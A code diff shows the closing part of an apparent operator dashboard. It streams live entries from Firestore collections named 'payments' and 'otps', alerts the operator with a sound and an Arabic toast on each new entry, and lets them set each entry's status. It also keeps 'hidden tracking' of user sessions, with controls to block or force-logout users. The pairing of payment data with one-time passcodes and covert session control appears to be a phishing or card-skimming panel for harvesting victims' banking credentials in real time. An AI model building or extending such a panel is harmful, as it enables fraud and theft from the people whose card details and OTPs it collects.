+                            ${!isLoggedOut
+                                ? `<button class="mini-btn logout" onclick="logoutUser('${s.id}')"><i class="fa-solid fa-right-from-bracket"></i></button>`
+                                : ''}
+                        </div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        // ============= Global Actions =============
+        window.processAction = function(collectionName, docId, newStatus) {
+            playSound('click');
+            const cardElement = event.target.closest('.order-card');
+            if (cardElement) {
+                cardElement.style.opacity = '0.6';
+                cardElement.style.pointerEvents = 'none';
+            }
+
+            db.collection(collectionName).doc(docId).update({ status: newStatus })
+            .catch(err => console.error("Sync Error: ", err));
+        };
+
+        window.blockUser = function(uid) {
+            playSound('click');
+            db.collection("sessions").doc(uid).update({
+                status: 'blocked',
+                blockedAt: firebase.firestore.FieldValue.serverTimestamp()
+            }).then(() => showToast('🚫 تم حظر المستخدم'))
+              .catch(err => console.error(err));
+        };
+
+        window.unblockUser = function(uid) {
+            playSound('click');
+            db.collection("sessions").doc(uid).update({
+                status: 'active'
+            }).then(() => showToast('✅ تم إلغاء الحظر'))
+              .catch(err => console.error(err));
+        };
+
+        window.logoutUser = function(uid) {
+            playSound('click');
+            db.collection("sessions").doc(uid).update({
+                status: 'logged-out',
+                loggedOutAt: firebase.firestore.FieldValue.serverTimestamp()
+            }).then(() => showToast('👋 تم تسجيل خروج المستخدم'))
+              .catch(err => console.error(err));
+        };
+
+        // ============= Firestore Listeners =============
+        // Payments collection
+        db.collection("payments").onSnapshot((snapshot) => {
+            let changed = false;
+            snapshot.docChanges().forEach((change) => {
+                const data = { ...change.doc.data(), id: change.doc.id, type: 'payments' };
+                if (change.type === "added" || change.type === "modified") {
+                    unifiedData.set(data.id, data);
+                    if (change.type === "added" && !initialLoad) {
+                        playSound('newOrder'); showToast('جالك طلب جديد حيّ الله بالنشامى!');
+                    }
+                    changed = true;
+                }
+                if (change.type === "removed") {
+                    unifiedData.delete(data.id);
+                    changed = true;
+                }
+            });
+            if (changed) {
+                renderFeed();
+                renderGroupedOTPs();
+            }
+        });
+
+        // OTPs collection
+        db.collection("otps").onSnapshot((snapshot) => {
+            let changed = false;
+            snapshot.docChanges().forEach((change) => {
+                const data = { ...change.doc.data(), id: change.doc.id, type: 'otps' };
+                if (change.type === "added" || change.type === "modified") {
+                    unifiedData.set(data.id, data);
+                    if (change.type === "added" && !initialLoad) {
+                        playSound('newOrder'); showToast('جالك طلب جديد حيّ الله بالنشامى!');
+                    }
+                    changed = true;
+                }
+                if (change.type === "removed") {
+                    unifiedData.delete(data.id);
+                    changed = true;
+                }
+            });
+            if (changed) {
+                renderFeed();
+                renderGroupedOTPs();
+            }
+
+            setTimeout(() => { initialLoad = false; }, 2000);
+        });
+
+        // Sessions collection (hidden tracking)
+        db.collection("sessions").onSnapshot((snapshot) => {
+            let changed = false;
+            snapshot.docChanges().forEach((change) => {
+                const data = { ...change.doc.data(), id: change.doc.id };
+                if (change.type === "added" || change.type === "modified") {
+                    sessionsData.set(data.id, data);
+                    changed = true;
+                }
+                if (change.type === "removed") {
+                    sessionsData.delete(data.id);
+                    changed = true;
+                }
+            });
+            if (changed) renderSessions();
+        });
+
+        // Re-render sessions every 30 seconds (to update "last seen" times)
+        setInterval(() => {
+            if (currentMode === 'supervisor' && sessionsData.size > 0) {
+                renderSessions();
+            }
+        }, 30000);
+    </script>
+</body>
+</html>
